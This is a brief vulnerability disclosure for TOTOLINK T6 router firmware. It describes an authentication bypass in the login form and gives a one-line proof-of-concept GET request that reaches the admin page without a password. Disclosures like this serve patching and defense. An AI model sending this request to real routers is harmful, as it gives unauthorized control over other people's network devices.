# TOTOLINK T6 Vulnerability
---
-   Vendor: TOTOLINK
-   Product: T6
-   Version: T6 V3_Firmware - V4.1.5cu.748_B20211015
-   Vuln Type: formAuthLogin bypass    
-   Author: c0nyy, Reisen_1943    

### Vulnerability description:

---
 - This vulnerability allows remote attackers to access the admin page without a password by manipulating the **authCode** parameter to **1** and setting the **goURL** parameter to **home.html**.
 - PoC: **GET /formLoginAuth.htm?authCode=1&userName=admin&goURL=home.html&action=login HTTP/1.1**

![POC_T6](https://github.com/user-attachments/assets/b2ac74e0-a887-4777-9b13-d0830a6655d0)
